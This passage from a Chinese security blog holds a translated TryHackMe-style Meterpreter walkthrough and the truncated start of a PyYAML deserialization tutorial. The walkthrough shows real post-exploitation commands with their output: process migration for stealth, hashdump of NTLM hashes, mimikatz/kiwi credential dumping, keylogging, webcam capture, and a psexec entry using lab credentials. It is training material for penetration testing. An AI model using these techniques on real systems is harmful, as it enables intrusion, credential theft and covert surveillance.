IDS（入侵检测系统）解决方案检测到。如果目标组织不解密和检查进出本地网络的加密流量（例如 HTTPS），IPS 和 IDS 解决方案将无法检测其活动。 虽然 Meterpreter 被主要防病毒软件识别，但此功能提供了一定程度的隐蔽性。 下面的示例显示了使用 MS17-010 漏洞利用的目标 Windows 计算机。您将看到 Meterpreter 正在运行，进程 ID (PID) 为 1304；这个 PID 在你的情况下会有所不同。我们使用了 getpid 命令，它返回运行 Meterpreter 的进程 ID。操作系统使用进程 ID（或进程标识符）来识别正在运行的进程。所有在Linux或Windows中运行的进程都会有一个唯一的ID号；该数字用于在需要时（例如，如果需要停止）与进程进行交互。 meterpreter &gt; getpid Current pid: 1304 如果我们使用 ps 命令列出目标系统上运行的进程，我们会看到 PID 1304 是 spoolsv.exe 而不是 Meterpreter.exe，正如人们所期望的那样。 meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 396 644 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\LogonUI.exe 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 428 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 548 540 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 596 540 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\wininit.exe 604 588 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 644 588 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\winlogon.exe 692 596 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\services.exe 700 692 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 716 596 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsass.exe 1276 1304 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\cmd.exe 1304 692 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1340 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1388 548 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe 即使我们更进一步，查看 Meterpreter 进程（在本例中为 PID 1304）使用的 DLL（动态链接库），我们仍然不会发现任何东西（例如，没有meterpreter.dll） C:\\Windows\\system32&gt;tasklist /m /fi \"pid eq 1304\" tasklist /m /fi \"pid eq 1304\" Image Name PID Modules ========================= ======== ============================================ spoolsv.exe 1304 ntdll.dll, kernel32.dll, KERNELBASE.dll, msvcrt.dll, sechost.dll, RPCRT4.dll, USER32.dll, GDI32.dll, LPK.dll, USP10.dll, POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll, ADVAPI32.dll, OLEAUT32.dll, ole32.dll, DEVOBJ.dll, DNSAPI.dll, WS2_32.dll, NSI.dll, IMM32.DLL, MSCTF.dll, CRYPTBASE.dll, slc.dll, RpcRtRemote.dll, secur32.dll, SSPICLI.DLL, credssp.dll, IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll, wshtcpip.dll, wship6.dll, rasadhlp.dll, fwpuclnt.dll, CLBCatQ.DLL, umb.dll, ATL.DLL, WINTRUST.dll, CRYPT32.dll, MSASN1.dll, localspl.dll, SPOOLSS.DLL, srvcli.dll, winspool.drv, PrintIsolationProxy.dll, FXSMON.DLL, tcpmon.dll, snmpapi.dll, wsnmp32.dll, msxml6.dll, SHLWAPI.dll, usbmon.dll, wls0wndh.dll, WSDMon.dll, wsdapi.dll, webservices.dll, FirewallAPI.dll, VERSION.dll, FunDisc.dll, fdPnp.dll, winprint.dll, USERENV.dll, profapi.dll, GPAPI.dll, dsrole.dll, win32spl.dll, inetpp.dll, DEVRTL.dll, SPINF.dll, CRYPTSP.dll, rsaenh.dll, WINSTA.dll, cscapi.dll, netutils.dll, WININET.dll, urlmon.dll, iertutil.dll, WINHTTP.dll, webio.dll, SHELL32.dll, MPR.dll, NETAPI32.dll, wkscli.dll, PSAPI.DLL, WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL, apphelp.dll, NLAapi.dll, napinsp.dll, pnrpnsp.dll, winrnr.dll C:\\Windows\\system32&gt; 可用于检测 Meterpreter 的技术和工具超出了本文涉及的知识点范围。 本文旨在向你展示 Meterpreter 的隐蔽运行方式，但是请记住，大多数防病毒软件都会检测到它；另外值得注意的是，Meterpreter 会与攻击者的系统建立加密（TLS）通信通道。 0x02 Meterpreter的特性 正如在之前的 Metasploit 知识点文章中所讨论的，Metasploit 有效载荷最初可以分为两类： 内联（也称为单）payload 和分阶段payload。 分阶段的payload分两步发送到目标机器，先装载初始部分（stager）的payload，再请求加载其余部分的payload，这允许存在较小的初始payload片段；而内联payload则是一次性全部发送。Meterpreter 有效载荷也分为分段和内联版本，但是，Meterpreter本身有多种不同的版本，你可以根据你的目标系统进行选择。 了解可用的 Meterpreter 版本的最简单方法是使用 msfvenom 列出它们，如下所示。 使用\" msfvenom --list payloads \" 命令再加上\" | grep meterpreter \" 筛选出meterpreter 类型的payload。 root@ip-10-10-186-44:~# msfvenom --list payloads | grep meterpreter android/meterpreter/reverse_http Run a meterpreter server in Android. Tunnel communication over HTTP android/meterpreter/reverse_https Run a meterpreter server in Android. Tunnel communication over HTTPS android/meterpreter/reverse_tcp Run a meterpreter server in Android. Connect back stager android/meterpreter_reverse_http Connect back to attacker and spawn a Meterpreter shell android/meterpreter_reverse_https Connect back to attacker and spawn a Meterpreter shell android/meterpreter_reverse_tcp Connect back to the attacker and spawn a Meterpreter shell apple_ios/aarch64/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) apple_ios/aarch64/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) apple_ios/aarch64/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) apple_ios/armle/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) apple_ios/armle/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) apple_ios/armle/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) java/meterpreter/bind_tcp Run a meterpreter server in Java. Listen for a connection java/meterpreter/reverse_http Run a meterpreter server in Java. Tunnel communication over HTTP java/meterpreter/reverse_https Run a meterpreter server in Java. Tunnel communication over HTTPS java/meterpreter/reverse_tcp Run a meterpreter server in Java. Connect back stager linux/aarch64/meterpreter/reverse_tcp Inject the mettle server payload (staged). Connect back to the attacker linux/aarch64/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) linux/aarch64/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) linux/aarch64/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) linux/armbe/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) linux/armbe/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) linux/armbe/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) linux/armle/meterpreter/bind_tcp Inject the mettle server payload (staged). Listen for a connection linux/armle/meterpreter/reverse_tcp Inject the mettle server payload (staged). Connect back to the attacker [...] 该列表将显示适用于以下平台的 Meterpreter 版本： Android Apple iOS Java Linux OSX PHP Python Windows 你决定使用哪个版本的 Meterpreter 将主要基于三个因素： 目标操作系统（目标操作系统是 Linux 还是 Windows？是 Mac 设备？是 Android 手机？等等） 目标系统上可用的组件（是否安装了 Python？这是一个 PHP 网站吗？等等） 你可以与目标系统建立的网络连接类型（它们允许原始 TCP 连接吗？你只能有一个 HTTPS 反向连接吗？IPv6 地址不像 IPv4 地址那样受到密切监控吗？等等） 如果你不使用 Meterpreter 作为由 Msfvenom 生成的独立有效载荷，你的payload选择也可能会受到漏洞exp的限制。 你会注意到一些漏洞exp具有默认的 Meterpreter 有效载荷，如下面示例中的 ms17_010_eternalblue 漏洞exp所示，它的默认payload就是meterpreter类型。 msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue [*] Using configured payload windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 你可以在任意模块中使用 show payloads 命令，列出其他可用的有效载荷。 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 generic/custom manual No Custom Payload 1 generic/shell_bind_tcp manual No Generic Command Shell, Bind TCP Inline 2 generic/shell_reverse_tcp manual No Generic Command Shell, Reverse TCP Inline 3 windows/x64/exec manual No Windows x64 Execute Command 4 windows/x64/loadlibrary manual No Windows x64 LoadLibrary Path 5 windows/x64/messagebox manual No Windows MessageBox x64 6 windows/x64/meterpreter/bind_ipv6_tcp manual No Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager 7 windows/x64/meterpreter/bind_ipv6_tcp_uuid manual No Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support 8 windows/x64/meterpreter/bind_named_pipe manual No Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager [...] 0x03 Meterpreter 命令 在任何已经成功建立的Meterpreter 会话中（命令提示符界面为 Meterpreter &gt; ）输入help，将列出所有可用的命令（下图只显示出一部分命令）。 meterpreter &gt; help Core Commands ============= Command Description ------- ----------- ? Help menu background Backgrounds the current session bg Alias for background bgkill Kills a background meterpreter script bglist Lists running background scripts bgrun Executes a meterpreter script as a background thread channel Displays information or control active channels close Closes a channel[...] 每个版本的 Meterpreter 都会有不同的命令选项，因此运行help 命令总是一个好主意。命令是 Meterpreter 上可用的内置工具。它们将在目标系统上运行，而无需加载任何其他脚本或可执行文件。 Meterpreter 将为您提供三个主要类别的工具； Built-in commands 内置命令 Meterpreter tools Meterpreter工具 Meterpreter scripting Meterpreter 脚本 当你输入\" help \"命令来查看命令列表时，你将看到 Meterpreter中的命令 被列举在不同的类别下： Core commands 核心命令 File system commands 文件系统命令 Networking commands 联网命令 System commands 系统命令 User interface commands 用户界面命令 Webcam commands 网络摄像头命令 Audio output commands 音频输出命令 Elevate commands 提升命令 Password database commands 密码数据库命令 Timestomp commands 时间戳命令 请注意，上面的列表取自 Windows 版本的 Meterpreter (windows/x64/meterpreter/reverse_tcp) 上的\" help \" 命令的输出结果，对于其他 Meterpreter 版本，这些命令列表将有所不同。 Meterpreter 命令详解 核心命令将有助于在目标系统上导航 并能与目标系统发生交互。下面是一些最常用的命令，在成功建立meterpreter会话之后，记得运行\" help \"命令来检查当前的meterpreter中的所有可用命令。 Core commands 核心命令 background: 背景化当前会话 exit: 终止 Meterpreter 会话 guid: 获取会话 GUID (全局唯一标识符) help: 显示帮助菜单 info:显示有关Post模块的信息 irb: 在当前会话上打开交互式 Ruby shell load: 加载一个或多个 Meterpreter 扩展 migrate: 允许你将 Meterpreter 迁移到另一个进程 run:执行 Meterpreter 脚本或 Post 模块 sessions: 快速切换到另一个会话 File system commands 文件系统命令 cd: 将更改目录 ls: 将在工作目录中列出文件(dir 也可以) pwd: 打印当前的工作目录 edit: 将允许你编辑文件 cat:将向屏幕显示文件的内容 rm: 将删除指定的文件 search: 将搜索文件 upload: 将上传文件或目录 download: 将下载文件或目录 Networking commands 联网命令 arp: 显示主机 ARP (地址解析协议–Address Resolution Protocol)缓存 ifconfig: 显示目标系统上可用的网络接口 netstat: 显示网络连接 portfwd: 将本地端口转发到远程服务 route:允许你查看和修改路由表 System commands 系统命令 clearev: 清除事件（event ）日志 execute: 执行（execute）命令 getpid: 显示当前的进程ID getuid: 显示正在运行 Meterpreter 的用户身份 kill: 终止进程 pkill:按名称终止进程 ps: 列出正在运行的进程 reboot: 重启远程计算机 shell: 进入系统命令shell shutdown: 关闭远程计算机 sysinfo:获取远程系统的信息，例如操作系统 Others Commands 其他命令(这些命令将列在帮助菜单的不同菜单类别下) idletime: 返回远程用户空闲的秒数 keyscan_dump: 转储按键缓冲区 keyscan_start: 开始捕捉按键 keyscan_stop: 停止捕捉按键 screenshare: 允许你实时监视远程用户的桌面 screenshot: 抓取交互式桌面的屏幕快照 record_mic: 从默认麦克风记录 X 秒的音频 webcam_chat: 开始视频聊天 webcam_list: 列出网络摄像头 webcam_snap: 从指定的摄像头拍摄快照 webcam_stream:播放指定摄像头的视频流 getsystem:试图将你的权限提升到本地系统的权限 hashdump: 转储 SAM 数据库的内容 尽管所有这些命令在帮助菜单下似乎都可用，但它们可能并不都有效。例如，目标系统可能没有网络摄像头，或者目标系统可以在没有适当桌面环境的虚拟机上运行。 0x04 Meterpreter 进行后渗透 Meterpreter 为你提供了许多有用的命令，可以帮助你完成后期利用（后渗透）阶段，下面是一些你经常使用的例子。 Help 此命令将为你提供 Meterpreter 中所有可用命令的列表。正如我们之前看到的，Meterpreter 有很多版本，每个版本可能有不同的可用选项。一旦你成功建立了一个 Meterpreter 会话，输入help命令 将帮助你快速浏览可用的Meterpreter 命令。 meterpreter &gt; help Core Commands ============= Command Description ------- ----------- ? Help menu background Backgrounds the current session bg Alias for background bgkill Kills a background meterpreter script bglist Lists running background scripts bgrun Executes a meterpreter script as a background thread channel Displays information or control active channels close Closes a channel[...] Meterpreter命令 getuid 命令将显示当前运行 Meterpreter 的用户。这将使您了解目标系统上可能的权限级别（例如，您是像 NT AUTHORITY\\SYSTEM 这样的管理员级别用户还是普通用户？） meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; ps 命令将列出正在运行的进程。 PID 列还将为您提供将 Meterpreter 迁移到另一个进程所需的 PID 信息。 meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 396 644 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\LogonUI.exe 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 428 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 548 540 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 596 540 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\wininit.exe 604 588 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 644 588 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\winlogon.exe 692 596 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\services.exe 700 692 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 716 596 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsass.exe 724 596 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsm.exe 764 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 828 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 864 828 WmiPrvSE.exe 900 692 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 952 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1076 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1164 548 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe 1168 692 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1244 548 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe 1276 1304 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\cmd.exe 1304 692 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1340 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1388 548 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe[...] Migrate 迁移 迁移到另一个进程将有助于 Meterpreter 与之交互。例如，如果你看到目标上运行的文字处理器（例如 word.exe、notepad.exe 等），你可以迁移到它并开始捕获用户发送到此进程的按键记录。某些 Meterpreter 版本将为你提供 keyscan_start、keyscan_stop 和 keyscan_dump 命令选项，以使 Meterpreter 能够像键盘记录器一样工作。迁移到另一个进程也可以帮助你拥有更稳定的 Meterpreter 会话。 要迁移到其他任何进程，你需要输入 migrate 命令，后跟所需目标进程的 PID。 下面的示例显示 Meterpreter会话由当前进程 迁移到进程PID 716。 meterpreter &gt; migrate 716 [*] Migrating from 1304 to 716... [*] Migration completed successfully. meterpreter &gt; 注意：如果你从较高权限（例如 SYSTEM）用户迁移到由较低权限用户（例如 Web 服务器）启动的进程，你可能会失去你的用户权限而且你可能无法将它们取回。 Hashdump 哈希转储 hashdump 命令将列出 SAM 数据库的内容。SAM（安全帐户管理器–Security Account Manager）数据库在 Windows 系统上的作用是存储用户的密码，这些密码以 NTLM（新技术 LAN 管理器–New Technology LAN Manager）格式存储。 meterpreter &gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: meterpreter &gt; 虽然在数学上不可能“破解”这些哈希值，但是你仍然可以使用在线 NTLM 数据库或彩虹表攻击来获取明文密码。这些哈希值也可用于 Pass-the-Hash （哈希传递）攻击，以验证这些用户是否可以访问同一网络的其他系统。 Search search命令对于定位具有潜在价值信息的文件很有用。在 CTF 的上下文环境中，这个命令可用于快速找到flag或证明文件，而在实际的渗透测试活动中，你可能需要搜索用户生成的文件或一些可能包含密码、帐户信息的配置文件。 meterpreter &gt; search -f flag2.txt Found 1 result... c:\\Windows\\System32\\config\\flag2.txt (34 bytes) meterpreter &gt; Shell shell 命令将在目标系统上启动一个常规命令行 shell，按下 CTRL+Z 将帮助你返回至 Meterpreter shell。 meterpreter &gt; shell Process 2124 created. Channel 1 created. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; 0x05 后渗透挑战 Meterpreter 提供了几个重要的后渗透工具。 前面提到的命令，例如 \" getsystem \" 和\" hashdump \" 将为权限提升和横向移动提供重要的杠杆和信息。基于Meterpreter，你可以使用它来运行 Metasploit 框架上一些可用的后渗透模块。最后，你还可以使用\" load \"命令来利用其他工具，例如 加载Kiwi或者加载整个Python语言。 meterpreter &gt; load python Loading extension python...Success. meterpreter &gt; python_execute \"print 'TryHackMe Rocks!'\" [+] Content written to stdout: TryHackMe Rocks! meterpreter &gt; Meterpreter 具有一些功能，能够帮助完成后渗透阶段的多个目标。 收集有关目标系统的更多信息。 在目标系统上寻找有价值的文件、寻找用户凭据、寻找额外的网络接口和一般信息。 权限提升。 横向移动。 使用 load 命令加载完任何其他工具后，你将在帮助菜单上看到一些新选项。下面的示例显示了添加Kiwi模块之后 产生的命令（先使用 load kiwi 命令）。 meterpreter &gt; load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' &gt; http://pingcastle.com / http://mysmartlogon.com ***/ Success. 在完成模块添加之后，meterpreter命令列表会根据load的菜单发生一些新的变化，请使用 help命令重新查看命令列表： Kiwi Commands ============= Command Description ------- ----------- creds_all Retrieve all credentials (parsed) creds_kerberos Retrieve Kerberos creds (parsed) creds_msv Retrieve LM/NTLM creds (parsed) creds_ssp Retrieve SSP creds creds_tspkg Retrieve TsPkg creds (parsed) creds_wdigest Retrieve WDigest creds (parsed) dcsync Retrieve user account information via DCSync (unparsed) dcsync_ntlm Retrieve user account NTLM hash, SID and RID via DCSync golden_ticket_create Create a golden kerberos ticket kerberos_ticket_list List all kerberos tickets (unparsed) kerberos_ticket_purge Purge any in-use kerberos tickets kerberos_ticket_use Use a kerberos ticket kiwi_cmd Execute an arbitary mimikatz command (unparsed) lsa_dump_sam Dump LSA SAM (unparsed) lsa_dump_secrets Dump LSA secrets (unparsed) password_change Change the password/hash of a user wifi_list List wifi profiles/creds for the current user wifi_list_shared List shared wifi profiles/creds (requires SYSTEM) 回答下面的问题将帮助你更好地了解 Meterpreter 如何在后渗透中使用。 你可以使用下面的凭据来模拟 针对SMB（服务器消息块）的初始攻击（使用 \" exploit/windows/smb/psexec \" 模块） Username: ballen Password: Password1 首先nmap命令扫服务端口：nmap -T4 -sS -p- 10.10.195.224 之后上msfconsole攻击对应的SMB服务 然后直接拿到session会话，sysinfo获取计算机名称以及目标域 不过这里非预期了，跟着文章思路看看，首先background挂后台 use post/windows/gather/enum_domain//查看域控 用户可能创建的共享的名称是什么？ use post/windows/gather/enum_shares 但我这里报错了不知道为何，先上一个正确结果吧 jchambers 用户的 NTLM 哈希值是什么？ sessions -i 1//重新进入会话 //直接hashdump获取用户hash 这里如果用户权限不足，也可ps查看进程，如下图，可以找到对应的高权限进程，使用migrate pid迁移到对应进程即可提权 jchambers 用户的明文密码是什么？ “secrets.txt”文件位于哪里？ （文件的完整路径） search -f secrets.txt #search -f *.txt 文件较少时用*.txt c:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt shell #使用shell命令进入目标系统的shell环境，方便进行cd--目录切换操作 cd c:\\Program Files (x86)\\Windows Multimedia Platform\\ type secrets.txt “secrets.txt”文件中透露的 Twitter 密码是什么？ “realsecret.txt”文件位于哪里？ （文件的完整路径） 真正的秘密是什么？","tags":["Metasploit"],"categories":["Metasploit"]},{"title":"PyYmal反序列化","path":"/2024/03/23/pyyaml-fan-xu-lie-hua/","content":"0x01 YMAL简介 YAML是一种轻量级的数据序列化语言，它的名称是\"YAML Ain’t Markup Language\"的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。 YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等）、序列（数组、列表等）和映射（键值对）。YAML还支持注释和引用，可以使文档更易于理解和维护。（其文件一般以.yml为后缀） 0x02 Yaml基本语法 这里也就是纯cv了。 大小写敏感 aaa:1 AAA:2 这两个对于Yaml来说是不同的变量 使用缩进表示层级关系缩进不允许使用tab，只允许空格 缩进的空格数不重要，只要相同层级的元素左对齐即可 举个例子， # This is a YAML document with nested structures person: name: John age: 30 address: street: Main St. city: Anytown state: CA hobbies: - reading - hiking - swimming 在这个示例中，person是一个映射类型，包含四个键值对。其中address和hobbies都是映射类型和序列类型的嵌套结构，使用缩进表示层级关系。address包含三个键值对，hobbies包含一个序列，其中包含三个元素。 '#'表示注释 但是只能支持单行注释 #注释1 #注释2 一个文件中可以包含多个文件的内容，用“ — ”即三个破折号表示一份内容的开始，用“ … ”即三个小数点表示一份内容的结束（非必需） --- example1: username: admin passwd: 123456 ... --- example2: username: aaa passwd: 666 ... 0x03 Yaml数据类型与结构 标量（Scalar）：标量是YAML中的基本数据类型，包括字符串、整数、浮点数、布尔值等。例如： name: \"John\" # 字符串 age: 30 # 整数 （可以支持二进制表示） height: 5.8 # 浮点数 （可以支持科学计数法） is_student: false # 布尔值 (null,Null,~均为空) 列表（List）：列表用短横线（-）表示，可以包含多个标量值，形成一个有序的序列。例如： fruits: - apple - banana - orange 支持内敛格式（用方括号包裹，用逗号+空格分隔），例如： fruit: [apple, banana, orange] 支持多维数组（用缩进表示层级关系），例如： fruit: - - apple - banana - - orange 映射（Mapping）：映射用键值对表示，使用冒号（:）分隔键和值，可以包含多个键值对，形成一个无序的键值对集合。例如： person: name: John age: 30 city: New York 支持流式风格的语法(用花括号包裹，用逗号+空格分割)，例如： key: { username: admin, passwd: 123456} 可以使用“?”声明一个复杂对象，从而可以使用多个数组来组成键，例如： ? - user1 - user2 : - passwd1 - passwd2 允许多层嵌套(用缩进表示层级关系)，例如： example: aaa: 123 bbb: ccc: ddd: 666 在这个示例中，example是一个映射类型，包含一个键值对aaa和一个键值对bbb。bbb的值是一个映射类型，包含一个键值对ccc，而ccc的值又是一个映射类型，包含一个键值对ddd。ddd的值为666。 多行字符串（Multi-line String）：YAML支持在标量值中使用多行字符串，可以使用管道符（|）或折叠式大于号（&gt;）来表示。例如： description: | This is a multi-line string using the pipe symbol. # 每行的缩进和行尾空白都会被去掉，而额外的缩进会被保留 lines: &gt; aaa bbbbbb ccccccc dddddddd # 只有空白行才会被识别为换行，原来的换行符都会被转换成空格 字符串一般不用引号包裹，但是如果字符串中使用了反斜杠“\\”开头的转义字符就必须用引号包裹，例如 strings: - Hi - \"\\u0048\\u0069\" # Hi的Unicode编码 - \"\\x46\\x69\\x6e\\x65\" # Fine的Hex编码 引用（Reference）：YAML支持使用锚点（&amp;）和别名（*）来创建引用，可以在不同位置引用相同的值。例如： person1: &amp;person_alias name: John age: 30 person2: *person_alias 相当于 person1: name: John age: 30 person2: name: John age: 30 可以利用**锚点（&amp;）和别名（*）以及合并标签\"&lt;&lt;\"**将我们的yaml变得更加整洁，例如： # 使用锚点和别名消除重复代码 defaults: &amp;defaults host: localhost port: 8080 timeout: 30 development: &lt;&lt;: *defaults database: dev_db test: &lt;&lt;: *defaults database: test_db timeout: 60 production: &lt;&lt;: *defaults host: prod_host port: 80 相当于 development: host: localhost port: 8080 timeout: 30 database: dev_db test: host: localhost port: 8080 timeout: 60 database: test_db production: host: prod_host port: 80 timeout: 30 时间戳（Timestamp）：在YAML中，可以使用ISO 8601格式的时间戳来表示日期和时间。ISO 8601是一种国际标准，用于表示日期、时间和日期时间的格式，例如： timestamp: 2023-04-24T12:34:56.789Z 类型转换 Yaml支持使用**严格类型标签\"!!\"（双感叹号+目标类型）**来强制转换类型，例如： # 使用显式类型转换将字符串转换成整数和浮点数 age: !!int 30 pi: !!float 3.14 # 使用显式类型转换将数字转换成字符串 number_as_str: !!str 123 # 使用显式类型转换将字符串转换成布尔值 is_valid: !!bool \"true\" # 使用显式类型转换将时间戳转换成日期时间 created_at: !!timestamp 2023-04-24T12:34:56.789Z # 使用显式类型转换将列表转换成其他类型 list_as_str: !!str [1, 2, 3] list_as_map: !!map [1, 2, 3] 0x04 反序列化漏洞成因 PyYaml&lt;=5.1 在python中的PyYAML库中提供这几种方式实现python和Yaml这两种语言的转换。 yaml-&gt;python yaml.dump yaml.dump(data) 将Python对象data转换为YAML格式的方法。它将Python对象序列化为YAML格式的字符串，并返回这个字符串。在这个方法中，data是一个Python对象，可以是字典、列表、元组、整数、浮点数、字符串、布尔值等基本数据类型，也可以是自定义的类的实例。 举个例子： import yaml data = { 'name': 'John', 'age': 30, 'is_student': True, 'hobbies': ['reading', 'swimming', 'traveling'], 'address': { 'street': '123 Main St', 'city': 'Anytown', 'state': 'CA', 'zip': '12345' } } yaml_data = yaml.dump(data) print(yaml_data) 输出结果： address: city: Anytown state: CA street: 123 Main St zip: '12345' age: 30 hobbies: - reading - swimming - traveling is_student: true name: John 在这段代码中， 我们定义了一个data字典，然后使用yaml.dump方法将data对象序列为yaml格式，并赋值给yaml_data，最后打印出来，得到我们最终的yaml格式数据 其实通俗点来说，就是将python的对象实例转化为yaml格式的字符串，也就是序列化。 如果我们的Python对象中包含自定义类的实例、函数等，那么使用yaml.dump方法进行序列化可能会导致安全问题。攻击者可以通过在YAML数据中注入恶意代码来执行任意代码，从而导致应用程序受到攻击。 python-&gt;yaml load() load(data) load(data)是将YAML格式的字符串转换为Python对象的方法。它将YAML格式的字符串反序列化为Python对象，并返回这个对象。在这个方法中，data是一个包含YAML格式字符串的变量，可以是从文件中读取的字符串，也可以是用户输入的字符串等。 import yaml data = \"\"\" address: city: Anytown state: CA street: 123 Main St zip: '12345' age: 30 hobbies: - reading - swimming - traveling is_student: true name: John \"\"\" yaml_data = yaml.load(data, Loader=yaml.Loader) print(yaml_data) 这里看文章他只使用load(data)就能行，但我这里必须添加Loader解析器参数 {'address': {'city': 'Anytown', 'state': 'CA', 'street': '123 Main St', 'zip': '12345'}, 'age': 30, 'hobbies': ['reading', 'swimming', 'traveling'], 'is_student': True, 'name': 'John'} 这段代码是将一个包含YAML格式字符串的变量yaml_data反序列化为Python对象，并将其赋值给变量data。然后，它打印出data，输出反序列化后的Python对象。 load(data, Loader=yaml.Loader) load(data, Loader=yaml.Loader)是将YAML格式的字符串转换为Python对象的方法，其中Loader参数指定了YAML解析器的类型。 在默认情况下，yaml.load方法使用的解析器是yaml.SafeLoader，它可以安全地解析大多数YAML格式数据，但是不能解析包含Python对象的YAML数据。 &lt;=5.1 版本中提供了几个方法用于解析 YAML： yaml.load：加载单个 YAML 配置 yaml.load_all：加载多个 YAML 配置 这里说明一下PyYaml&lt;=5.1版本的Loader都有哪些加载器 Constructor:5.1版本一下默认此加载器，在 YAML 规范上新增了很多强制类型转换 BaseConstructor：不支持强制类型转换 SafeConstructor：支持强制类型转换和 YAML 规范保持一致 这里以默认的Constructor加载器为例，示例代码： import yaml class Person: def __init__(self, name, age): self.name = name self.age = age # 自定义构造器函数 def construct_person(loader, node): # 获取Person类的属性值 data = loader.construct_mapping(node, deep=True) # 实例化Person类并设置属性 return Person(data['name'], data['age']) # 将!python/object标签映射到自定义构造器函数 yaml.add_constructor('!python/object:__main__.Person', construct_person) # 定义一个包含自定义类实例的YAML数据 yaml_data = \"\"\" name: John age: 30 person: !python/object:__main__.Person name: Alice age: 25 \"\"\" # 使用yaml.Loader()方法解析YAML数据 data = yaml.load(yaml_data, Loader=yaml.Loader) # 